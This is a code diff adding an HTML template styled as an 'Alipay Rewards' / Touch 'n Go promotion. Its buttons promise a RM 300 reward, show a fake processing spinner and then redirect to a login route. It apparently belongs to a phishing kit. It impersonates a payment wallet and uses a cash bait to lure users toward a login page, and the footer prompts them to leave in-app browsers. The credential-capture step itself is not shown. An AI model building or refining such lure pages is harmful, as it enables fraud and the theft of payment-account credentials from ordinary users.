@@ -1,0 +1,244 @@
+{% extends "layout.html" %} {% block content %}
+
+<div id="loading">
+  <div class="loader-box">
+    <img
+      src="{{ url_for('static', filename='tng.png') }}"
+      class="loader-logo"
+    />
+
+    <!-- LOADER TAMBAHAN -->
+    <div class="loader-ring"></div>
+
+    <p class="loader-text">Processing...</p>
+  </div>
+</div>
+
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(180deg, #4a7be7, #5fa2ff);
+  }
+
+  html,
+  body {
+    overflow-x: hidden;
+  }
+
+  /* WRAPPER */
+  .main {
+    max-width: 400px;
+    margin: auto;
+    padding: 20px;
+    text-align: center;
+    color: white;
+  }
+
+  .top-logo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 2px; /* 🔥 kecilkan jarak logo & teks */
+    margin-top: 0px;
+  }
+
+  .loader-box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+  }
+
+  /* LOADER BULAT */
+  .loader-ring {
+    width: 40px;
+    height: 40px;
+    border: 4px solid rgba(255, 255, 255, 0.2);
+    border-top: 4px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  /* ANIMASI PUTAR */
+  @keyframes spin {
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+
+  /* LOGO ANIMASI */
+  .loader-logo {
+    width: 20% !important;
+    animation: pulse 1.2s infinite ease-in-out;
+  }
+
+  /* TEXT */
+  .loader-text {
+    color: white;
+    font-size: 14px;
+    opacity: 0.9;
+  }
+
+  /* ANIMASI */
+  @keyframes pulse {
+    0% {
+      transform: scale(1);
+      opacity: 0.7;
+    }
+    50% {
+      transform: scale(1.2);
+      opacity: 1;
+    }
+    100% {
+      transform: scale(1);
+      opacity: 0.7;
+    }
+  }
+
+  .logo-img {
+    width: 30% !important;
+    height: auto !important;
+    object-fit: contain;
+    margin-bottom: -2px !important;
+  }
+
+  /* TITLE */
+  .title-small {
+    font-size: 14px;
+    margin-top: 0; /* 🔥 hilangkan jarak atas */
+    line-height: 1.2;
+  }
+
+  /* JARAK KE TITLE BESAR */
+  .title-big {
+    font-size: 26px;
+    font-weight: bold;
+    margin: 14px 0; /* 🔥 kecilkan dari sebelumnya */
+  }
+
+  /* GAMBAR + OVERLAY */
+  .bg-wrapper {
+    position: relative;
+    width: 100%;
+  }
+
+  .bg-img {
+    width: 120% !important; /* 🔥 perbesar (default 100%) */
+    max-width: none;
+    display: block;
+    border-radius: 25px;
+    margin-left: -10%;
+  }
+
+  /* OVERLAY BUTTON */
+  .overlay {
+    position: absolute;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 80%;
+  }
+
+  /* BUTTON */
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: 25px;
+    border: none;
+    background: #ffd37a;
+    color: #000;
+    font-weight: bold;
+    font-size: 15px;
+    margin-bottom: 12px;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+
+  .btn:hover {
+    transform: scale(1.03);
+  }
+
+  /* FOOTER */
+  .footer {
+    margin-top: 20px;
+    font-size: 12px;
+    opacity: 0.9;
+  }
+
+  #loading {
+    position: fixed !important;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+
+    width: 100vw;
+    height: 100vh;
+
+    background: rgba(0, 0, 0, 0.7);
+    backdrop-filter: blur(5px);
+
+    display: none;
+    justify-content: center;
+    align-items: center;
+
+    z-index: 999999; /* lebih tinggi lagi */
+  }
+</style>
+
+<div class="main">
+  <!-- TITLE -->
+  <div class="top-logo">
+    <img
+      src="{{ url_for('static', filename='logo-ali.png') }}"
+      class="logo-img"
+    />
+    <div class="title-small">Alipay Rewards</div>
+  </div>
+  <div class="title-big">Share and Earn Money Pocket</div>
+
+  <!-- GAMBAR + BUTTON -->
+  <div class="bg-wrapper">
+    <img
+      src="{{ url_for('static', filename='background.png') }}"
+      class="bg-img"
+    />
+
+    <div class="overlay">
+      <button class="btn" onclick="showLoading('{{ url_for('login') }}')">
+        Claim RM 300 MP
+      </button>
+
+      <button class="btn" onclick="showLoading('{{ url_for('login') }}')">
+        Open Touch 'n Go
+      </button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    For a better experience, click the top-right menu to open in your browser
+  </div>
+</div>
+
+<script>
+  function go(url) {
+    window.location.href = url;
+  }
+</script>
+
+<script>
+  function showLoading(url) {
+    const loader = document.getElementById("loading");
+
+    loader.style.display = "flex";
+    loader.style.opacity = "1";
+
+    setTimeout(() => {
+      window.location.href = url;
+    }, 1500);
+  }
+</script>
+
+{% endblock %}
